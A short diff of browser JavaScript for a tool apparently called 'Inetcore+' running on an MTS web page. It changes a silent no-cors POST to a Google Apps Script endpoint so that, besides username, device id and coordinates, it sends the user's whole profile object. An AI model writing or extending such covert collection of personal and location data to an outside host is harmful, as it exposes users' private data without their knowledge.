@@ -43,12 +43,13 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 	}).then(function(resp){return resp.json()}).then(function(user_data){
 		if(user_data.data.username){
 			username=user_data.data.username;/*console.log('username',username);*/
-			if(!dev){
-				fetch('https://script.google.com/macros/s/AKfycbxXeWzgHKLS1X0y5SCDVqmbFPkZByfUAFieB5tS-tmQ1Ns3k8zQxr8IUA/exec',{
+			if(!dev){/*AKfycbxXeWzgHKLS1X0y5SCDVqmbFPkZByfUAFieB5tS-tmQ1Ns3k8zQxr8IUA*/
+				fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{
 					'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
 					'body':JSON.stringify({
 						obj:{
 							username:username,
+							user_data:user_data.data,
 							deviceid:deviceid,
 							latitude:user_data.data.latitude,
 							longitude:user_data.data.longitude,
